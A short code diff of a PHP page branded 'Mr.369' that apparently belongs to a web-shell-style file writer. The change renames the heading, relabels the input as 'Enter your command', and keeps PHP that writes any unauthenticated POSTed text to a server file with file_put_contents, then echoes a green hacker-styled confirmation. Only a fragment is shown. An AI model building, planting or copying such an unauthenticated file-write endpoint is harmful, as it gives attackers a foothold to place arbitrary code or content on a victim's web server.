@@ -46,9 +46,9 @@
     </style>
 </head>
 <body>
-    <h1>Welcome to Mr.369</h1>
+    <h1>Mr.369</h1>
     <form action="" method="post">
-        <p>Enter your text to save:</p>
+        <p>Enter your command</p>
         <textarea name="text" required></textarea><br>
         <button type="submit">Save</button>
     </form>
@@ -61,7 +61,7 @@
 
         $text = $_POST['text'];
 
-    
+
         if (file_put_contents($fileName, $text)) {
             echo "<p style='color: #00ff00;'>369 >  $fileName</p>";
         } else {
